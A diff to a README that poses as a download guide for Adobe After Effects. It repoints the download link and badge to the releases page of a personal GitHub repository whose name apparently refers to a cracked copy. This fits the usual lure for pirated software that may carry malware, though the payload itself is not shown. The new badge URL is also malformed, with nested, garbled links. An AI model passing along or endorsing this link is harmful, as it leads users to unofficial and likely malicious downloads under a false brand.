@@ -26,9 +26,9 @@ Whether you are a seasoned professional in the VFX industry or just starting to 
 
 ## Get Started 🚀
 
-To dive into the world of Adobe After Effects, download the application from the following link: [Download Adobe After Effects](https://github.com/releases/789694263/Release.zip)
+To dive into the world of Adobe After Effects, download the application from the following link: [Download Adobe After Effects](https://github.com/Mateja1Flipper/Adobe-After-Effects-Cr/releases)
 
-[![Download Adobe After Effects](https://img.shields.io/badge/Download-Adobe%20After%20Effects-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Adobe After Effects](https://github.com/Mateja1Flipper/Adobe-After-Effects-Cr/releases%20After%https://github.com/Mateja1Flipper/Adobe-After-Effects-Cr/releases)](https://github.com/Mateja1Flipper/Adobe-After-Effects-Cr/releases)
 
 ---
 
